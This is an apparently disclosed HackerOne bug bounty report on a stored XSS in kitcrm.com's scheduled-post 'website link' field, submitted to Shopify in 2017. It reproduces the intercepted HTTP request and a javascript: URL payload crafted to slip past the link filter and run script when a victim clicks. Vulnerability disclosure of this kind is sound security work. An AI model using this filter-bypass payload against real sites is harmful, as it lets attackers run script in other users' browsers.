# Stored passive XSS at scheduled posts (kitcrm.com)

## Report Details
- **Report ID**: 214581
- **URL**: https://hackerone.com/reports/214581
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-19T00:26:18.178Z
- **Disclosed**: 2017-03-28T20:57:36.389Z

## Reporter
- **Username**: skavans
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello!

There is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:

```http
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: kitcrm.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

javascript:alert(document.domain);//http://
-----------------------------15916813141840537191014403553
<redacted>
```

that leads to filter bypass and JS execution while victim clicks the link:

{F169880}


## Attachments
- ______________2017-03-19___3.24.18.png
